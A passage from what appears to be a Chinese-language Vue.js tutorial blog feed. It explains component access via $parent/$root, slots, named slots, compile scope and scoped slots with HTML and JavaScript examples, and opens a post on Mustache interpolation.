class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">cpn</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">template</span>: id = <span class="string">&#x27;#cpn&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;我是cpn组件的name&#x27;</span></span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">ccpn</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">template</span>: id = <span class="string">&#x27;#ccpn&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="title function_">btnClick</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 1.访问父组件$parent</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// console.log(this.$parent);</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// console.log(this.$parent.name);</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 2.访问根组件$root</span></span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$root</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$root</span>.<span class="property">message</span>);</span></span><br><span class="line"><span class="language-javascript">              &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="插槽slot"><a href="#插槽slot" class="headerlink" title="插槽slot"></a>插槽slot</h1><h2 id="为什么使用slot"><a href="#为什么使用slot" class="headerlink" title="为什么使用slot"></a>为什么使用slot</h2><p>slot翻译为插槽：</p><ul><li>在生活中很多地方都有插槽，电脑的USB插槽，插板当中的电源插槽。</li><li>插槽的目的是让我们原来的设备具备更多的<strong>扩展性</strong>。</li><li>比如电脑的USB我们可以插入U盘、硬盘、手机、音响、键盘、鼠标等等。</li></ul><p>组件的插槽：组件的插槽也是为了让我们封装的组件更加具有扩展性。让使用者可以决定组件内部的一些内容到底展示什么。</p><p>例子：移动网站中的导航栏</p><p>移动开发中，几乎每个页面都有导航栏。导航栏我们必然会封装成一个插件，比如nav-bar组件。一旦有了这个组件，我们就可以在多个页面中复用了。但是，每个页面的导航是一样的吗？No，以京东M站为例：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201029175544.png"></p><hr><p>如何封装合适呢？<strong>抽取共性，保留不同</strong>。</p><p>最好的封装方式就是将共性抽取到组件中，将不同保留为插槽。</p><p>一旦我们预留了插槽，就可以让使用者根据自己的需求，决定插槽中插入什么内容。</p><p>是搜索框，还是文字，还是菜单。由调用者自己来决定。</p><p>这就是为什么我们要学习组件中的插槽slot的原因。</p><h2 id="slot基本使用"><a href="#slot基本使用" class="headerlink" title="slot基本使用"></a>slot基本使用</h2><p>在子组件中使用特殊的元素<code>&lt;slot&gt;</code>就可以为子组件开启一个插槽。该插槽插入什么内容取决于父组件如何使用。</p><p><code>&lt;slot&gt;</code>中的内容表示，如果没有在该组件中插入任何其他内容，就默认显示该内容，也称<strong>后备内容</strong>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1.插槽的基本使用 &lt;slot&gt;&lt;/slot&gt;</span></span><br><span class="line"><span class="comment">2.插槽的默认值 &lt;slot&gt;button&lt;/slot&gt;</span></span><br><span class="line"><span class="comment">3.如果有多个值, 同时放入到组件进行替换时, 一起作为替换元素</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>哈哈哈<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;<span class="name">i</span>&gt;</span>呵呵呵<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">i</span>&gt;</span>呵呵呵<span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>我是div元素<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是p元素<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是组件<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>页面如下：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201029180534.png"></p><h2 id="具名插槽"><a href="#具名插槽" class="headerlink" title="具名插槽"></a>具名插槽</h2><blockquote><p>当子组件的功能复杂时，子组件的插槽可能并非是一个。</p><p>比如我们封装一个导航栏的子组件，可能就需要三个插槽，分别代表左边、中间、右边。</p><p>那么，外面在给插槽插入内容时，如何区分插入的是哪一个呢？</p><p>这个时候，我们就需要给插槽起一个名字，也就是使用具名插槽。</p></blockquote><p>只要给slot元素一个name属性即可<code>&lt;slot name=&#39;myslot&#39;&gt;&lt;/slot&gt;</code></p><p>一个不带 <code>name</code> 的 <code>&lt;slot&gt;</code> 出口会带有隐含的名字“default”。</p><p>在向具名插槽提供内容的时候，我们可以在一个 <code>&lt;template&gt;</code> 元素上使用 <code>v-slot</code> 指令，并以 <code>v-slot</code> 的参数的形式提供其名称。</p><p>跟 <code>v-on</code> 和 <code>v-bind</code> 一样，<code>v-slot</code> 也有缩写，即把参数之前的所有内容 (<code>v-slot:</code>) 替换为字符 <code>#</code>。例如 <code>v-slot:header</code> 可以被重写为 <code>#header</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--自 2.6.0 起引入v-slot--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:center</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>这是默认插槽的内容<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span>任何没有被包裹在带有 v-slot 的template标签中的内容都会被视为默认插槽的内容。<span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--自 2.6.0 起被废弃的旧语法--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">slot</span>=<span class="string">&quot;left&quot;</span>&gt;</span>返回<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;left&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>左边<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;center&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>中间<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;right&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>右边<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>页面如下：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201030094511.png"></p><h2 id="编译作用域"><a href="#编译作用域" class="headerlink" title="编译作用域"></a>编译作用域</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span> <span class="attr">v-show</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是子组件<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是内容, 哈哈哈<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-show</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">isShow</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">cpn</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">template</span>: id = <span class="string">&#x27;#cpn&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">isShow</span>: <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们来考虑下面的代码是否最终是可以渲染出来的：<br><code>&lt;cpn v-show=&quot;isShow&quot;&gt;&lt;/cpn&gt;</code>中，我们使用了isShow属性，该属性既包含在组件中，也包含在Vue实例中。</p><p>答案：最终可以渲染出来，也就是使用的是Vue实例的属性。</p><p>官方给出了一条准则：<strong>父组件模板的所有东西都会在父级作用域内编译；子组件模板的所有东西都会在子级作用域内编译。</strong></p><p>而我们在使用<code>&lt;cpn v-show=&quot;isShow&quot;&gt;&lt;/cpn&gt;</code>的时候，整个组件的使用过程是相当于在父组件中出现的。那么它的作用域就是父组件，使用的属性也是属于父组件的属性。因此，isShow使用的是Vue实例中的属性，而不是子组件的属性。</p><h2 id="作用域插槽"><a href="#作用域插槽" class="headerlink" title="作用域插槽"></a>作用域插槽</h2><p>有时插槽内容能够访问子组件中才有的数据是很有用的，这时需要用到作用域插槽。</p><p>作用域插槽一般用于：内容在子组件，希望父组件告诉我们如何展示。</p><p>例如，一个带有如下模板的 <code>&lt;cpn&gt;</code> 组件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span>&gt;</span></span><br><span class="line">      &#123;&#123;user.lastName&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们可能想换掉备用内容，用名而非姓（firstName：名；lastName：姓）来显示。如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">cpn</span>&gt;</span></span><br><span class="line">  &#123;&#123; user.firstName &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然而上述代码不会正常工作，因为只有 <code>&lt;cpn&gt;</code> 组件可以访问到 <code>user</code> ，而我们提供的内容是在父级渲染的（编译作用域）。</p><p>为了让 <code>user</code> 在父级的插槽内容中可用，我们可以将 <code>user</code> 作为 <code>&lt;slot&gt;</code> 元素的一个 attribute（任意命名，注意不与其他属性名冲突）绑定上去：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span> <span class="attr">:n</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">      &#123;&#123;user.firstName&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>绑定在 <code>&lt;slot&gt;</code> 元素上的 attribute 被称为<strong>插槽 prop</strong>，可以有多个。</p><p>现在在父级作用域中，我们可以使用带值的 <code>v-slot</code> 来定义我们提供的插槽 prop 的名字：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:default</span>=<span class="string">&quot;slotProps&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;slotProps.n.lastName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在这个例子中，我们选择将<strong>包含所有插槽 prop 的对象</strong>命名为 <code>slotProps</code>，但你也可以使用任意你喜欢的名字。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">&lt;!--推荐--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:default</span>=<span class="string">&quot;slotProps&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;slotProps.n.lastName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--自 2.6.0 起被废弃的旧语法--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">slot-scope</span>=<span class="string">&quot;slot&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;slot.n.lastName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span> <span class="attr">:n</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">      &#123;&#123;user.firstName&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">cpn</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">template</span>: id = <span class="string">&#x27;#cpn&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">user</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="attr">firstName</span>: <span class="string">&quot;Lebron&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">              <span class="attr">lastName</span>: <span class="string">&quot;James&quot;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 组件化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue基础语法</title>
      <link href="/posts/4159/"/>
      <url>/posts/4159/</url>
      
        <content type="html"><![CDATA[<h1 id="插值操作"><a href="#插值操作" class="headerlink" title="插值操作"></a>插值操作</h1><h2 id="Mustache"><a href="#Mustache" class="headerlink" title="Mustache"></a>Mustache</h2><p>Mustache语法(也就是双大括号)。Mustache 标签将会被替代为对应数据对象上的值。</p><p>无论何时，绑定的数据对象上值发生了改变，插值处的内容都会更新，数据是响应式的。</p><p>Mustache: 胡子&#x2F;胡须</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;message&#125;&#125;,阿楠<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;firstName + lastName&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;firstName + &#x27; &#x27; + lastName&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;firstName&#125;&#125; &#123;&#123;lastName&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;count * 2&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span 